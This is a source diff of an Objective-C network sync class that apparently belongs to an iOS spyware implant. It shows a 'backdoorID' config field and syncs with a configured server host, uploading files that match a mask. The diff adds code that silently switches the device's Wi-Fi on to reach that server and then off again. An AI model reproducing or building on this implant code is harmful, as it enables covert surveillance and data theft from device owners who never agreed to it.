@@ -8,6 +8,8 @@
  *
  */
 
+#import <notify.h>
+
 #import "RESTNetworkProtocol.h"
 #import "RESTTransport.h"
 
@@ -34,16 +36,11 @@
 //#define warnLog NSLog
 
 typedef struct _sync {
-//  u_int minSleepTime;
-//  u_int maxSleepTime;
-//  u_int bandwidthLimit;
-//  char  configString[256];
   u_int gprsFlag;  // bit 0 = Sync ON - bit 1 = Force
   u_int wifiFlag;
   u_int serverHostLength;
   wchar_t serverHost[256];
 } syncStruct;
-
 
 
 @implementation RESTNetworkProtocol
@@ -58,33 +55,35 @@ typedef struct _sync {
           errorLog(@"configuration is nil");
 #endif
           
-          [self release];
           return nil;
         }
       
+#ifdef DEBUG_PROTO
+      NSLog(@"configuration: %@", aConfiguration);
+#endif
+
       syncStruct *header  = (syncStruct *)[aConfiguration bytes];
-      mMinDelay           = 0;//header->minSleepTime;
-      mMaxDelay           = 0;//header->maxSleepTime;
-      mBandwidthLimit     = 10000000;//header->bandwidthLimit;
+      mMinDelay           = 0;
+      mMaxDelay           = 0;
+      mBandwidthLimit     = 10000000;
       
+      mWifiForce  = header->wifiFlag;
+      mGprsForce  = header->gprsFlag;
+      mWifiForced = NO;
+    
       NSString *host = [[NSString alloc] initWithCharacters: (unichar *)header->serverHost
                                                      length: header->serverHostLength / 2 - 1];
-      /*NSString *backdoorID  = [NSString stringWithCString:
-                               header->configString
-                               + strlen(header->configString)
-                               + 1];*/
-      
+
       NSString *_url;
       _url = [[NSString alloc] initWithFormat: @"http://%@:%d", host, 80];
       mURL    = [[NSURL alloc] initWithString: _url];
       [_url release];
     
 #ifdef DEBUG_PROTO
-    warnLog(@"minDelay  : %d", mMinDelay);
-    warnLog(@"maxDelay  : %d", mMaxDelay);
-    warnLog(@"bandWidth : %d", mBandwidthLimit);
-    warnLog(@"host      : %@", host);
-    warnLog(@"URL       : %@", mURL);
+      infoLog(@"wifi : %d", mWifiForce);
+      infoLog(@"gprs : %d", mGprsForce);
+      infoLog(@"host : %@", host);
+      infoLog(@"URL  : %@", mURL);
 #endif
     
       return self;
@@ -102,11 +101,35 @@ typedef struct _sync {
 // Abstract Class Methods
 - (BOOL)perform
 {
-#ifdef DEBUG_PROTO
-  infoLog(@"");
-#endif
-  
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
+  
+  // Check first what kind of connection we need/have
+  NetworkStatus status = [self getAvailableConnection];
+  if (status == NotReachable)
+    {
+#ifdef DEBUG_PROTO
+      warnLog(@"No connection available");
+#endif
+      // No connection, see if we have to force something
+      if (mWifiForce)
+        {
+          // Force Wifi Connection
+#ifdef DEBUG_PROTO
+          infoLog(@"Forcing WiFi Connection");
+#endif
+          mWifiForced = YES;
+          notify_post("com.apple.Preferences.WiFiOn");
+          // Now sleep in order to wait for the wifi connection
+          sleep(5);
+        }
+      else if (mGprsForce)
+        {
+          // Force GPRS Connection
+#ifdef DEBUG_PROTO
+          infoLog(@"Forcing GPRS Connection");
+#endif
+        }
+    }
   
   // Init the transport
   RESTTransport *transport = [[RESTTransport alloc] initWithURL: mURL
@@ -124,6 +147,11 @@ typedef struct _sync {
       [transport release];
       [outerPool release];
       
+      if (mWifiForced)
+        {
+          notify_post("com.apple.Preferences.WiFiOff");
+        }
+    
       return NO;
     }
   
@@ -141,6 +169,11 @@ typedef struct _sync {
       [transport release];
       [outerPool release];
       
+      if (mWifiForced)
+        {
+          notify_post("com.apple.Preferences.WiFiOff");
+        }
+    
       return NO;
     }
   
@@ -200,7 +233,7 @@ typedef struct _sync {
                         if (filesFound == nil)
                           {
 #ifdef DEBUG_PROTO
-                            errorLog(@"fileMask (%@) didn't match any files");
+                            errorLog(@"fileMask (%@) didn't match any files", fileMask);
 #endif
                             continue;
                           }
@@ -333,7 +366,13 @@ typedef struct _sync {
       errorLog(@"WTF error on BYE?!");
 #endif
     }
+  
   [byeOP release];
+  
+  if (mWifiForced)
+    {
+      notify_post("com.apple.Preferences.WiFiOff");
+    }
   
   //
   // Time to reload the configuration, if needed
@@ -362,5 +401,13 @@ typedef struct _sync {
   return YES;
 }
 // End Of Abstract Class Methods
+
+- (NetworkStatus)getAvailableConnection
+{
+  Reachability *reachability   = [Reachability reachabilityForInternetConnection];
+  NetworkStatus internetStatus = [reachability currentReachabilityStatus];
+  
+  return internetStatus;
+}
 
 @end
